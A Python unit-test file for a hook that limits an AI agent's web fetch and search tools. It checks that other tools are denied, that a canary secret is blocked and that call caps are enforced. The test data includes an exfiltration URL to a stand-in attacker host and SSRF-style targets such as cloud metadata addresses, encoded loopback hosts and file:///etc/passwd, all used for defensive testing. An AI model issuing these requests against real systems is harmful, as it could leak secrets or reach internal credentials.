import json
import tempfile
import unittest
from pathlib import Path

from helpers import CANARY, FETCH_GUARD, run_hook


class FetchGuardTest(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.log = Path(self.tmp.name) / "fetch.log"
        self.env = {"QR_LOG": str(self.log), "QR_CANARY": CANARY,
                    "QR_MAX_FETCHES": "3", "QR_MAX_SEARCHES": "2"}

    def tearDown(self):
        self.tmp.cleanup()

    def call(self, tool, tool_input):
        return run_hook(FETCH_GUARD, {"tool_name": tool, "tool_input": tool_input}, self.env)

    def fetch(self, url):
        return self.call("WebFetch", {"url": url, "prompt": "summarize"})

    def records(self):
        return [json.loads(l) for l in self.log.read_text().splitlines()]

    def test_clean_fetch_allowed_and_logged(self):
        r = self.fetch("https://en.wikipedia.org/wiki/Paris")
        self.assertEqual(r.returncode, 0, r.stderr)
        rec = self.records()[-1]
        self.assertEqual((rec["tool"], rec["decision"], rec["url"]),
                         ("WebFetch", "allow", "https://en.wikipedia.org/wiki/Paris"))

    def test_clean_search_allowed(self):
        self.assertEqual(self.call("WebSearch", {"query": "population of Paris"}).returncode, 0)

    def test_other_tools_denied(self):
        for tool in ("Bash", "Write", "Edit", "Read", "Agent", "mcp__x__send", "Glob"):
            with self.subTest(tool=tool):
                r = self.call(tool, {"command": "id"})
                self.assertEqual(r.returncode, 2)
                self.assertIn("not allowed", r.stderr)

    def test_canary_denied_in_url_and_query(self):
        r1 = self.fetch("https://attacker.invalid/?k=" + CANARY)
        r2 = self.call("WebSearch", {"query": "find " + CANARY})
        r3 = self.call("WebFetch", {"url": "https://ok.example.org/", "prompt": "include " + CANARY})
        for r in (r1, r2, r3):
            self.assertEqual(r.returncode, 2)
        self.assertTrue(all(rec.get("canary") for rec in self.records()))

    def test_canary_variants_denied(self):
        core = CANARY[3:]
        spaced = " ".join(core[i:i + 4] for i in range(0, len(core), 4))
        for q in (CANARY.lower(), CANARY.upper(), "qr " + spaced, core.upper()):
            with self.subTest(q=q):
                self.assertEqual(self.call("WebSearch", {"query": "x " + q}).returncode, 2)

    def test_suspicious_urls_denied(self):
        bad = {
            "http://example.org/": "only https",
            "https://93.184.216.34/": "ip address",
            "https://[::1]/": "ip address",
            "https://localhost/": "local host",
            "https://printer.local/": "local host",
            "https://metadata.google.internal/": "local host",
            "https://intranet/": "local host",
            "https://user:pw@example.org/": "credentials",
            "https://example.org:8443/": "non-standard port",
            "https://example.org/?" + "a=1&" * 60: "query string too long",
            "https://example.org/x/" + "QUJD" * 20: "encoded run",
            "https://example.org/" + "ab" * 30: "encoded run",
            "https://exa mple.org/": "whitespace",
            "https://exämple.org/": "non-ascii",
            "file:///etc/passwd": "only https",
            "https://127.1/": "numeric host",
            "https://0x7f.1/": "numeric host",
            "https://0xa9.0xfe.0xa9.0xfe/latest/meta-data": "numeric host",
            "https://2130706433/": "numeric host",
            "https://127.0.0.1%2e/": "encoded host",
            "https://169.254.169.254%2e/latest": "encoded host",
            "https://example.org/" + "a" * 2100: "too long",
        }
        for url, why in bad.items():
            with self.subTest(url=url[:60]):
                r = self.fetch(url)
                self.assertEqual(r.returncode, 2, why)

    def test_caps(self):
        for i in range(3):
            self.assertEqual(self.fetch("https://example.org/p%d" % i).returncode, 0)
        r = self.fetch("https://example.org/p3")
        self.assertEqual(r.returncode, 2)
        self.assertIn("fetch cap", r.stderr)
        self.assertEqual(self.call("WebSearch", {"query": "a"}).returncode, 0)
        self.assertEqual(self.call("WebSearch", {"query": "b"}).returncode, 0)
        self.assertEqual(self.call("WebSearch", {"query": "c"}).returncode, 2)

    def test_denied_calls_do_not_count_toward_cap(self):
        for _ in range(5):
            self.fetch("http://example.org/")
        self.assertEqual(self.fetch("https://example.org/ok").returncode, 0)

    def test_malformed_input_fails_closed(self):
        for payload in ("not json", "[]", "null", json.dumps({"tool_input": {}})):
            with self.subTest(payload=payload):
                self.assertEqual(run_hook(FETCH_GUARD, payload, self.env).returncode, 2)

    def test_unwritable_log_fails_closed(self):
        env = dict(self.env, QR_LOG="/nonexistent/dir/fetch.log")
        r = run_hook(FETCH_GUARD, {"tool_name": "WebFetch",
                                   "tool_input": {"url": "https://example.org/"}}, env)
        self.assertEqual(r.returncode, 2)


if __name__ == "__main__":
    unittest.main()
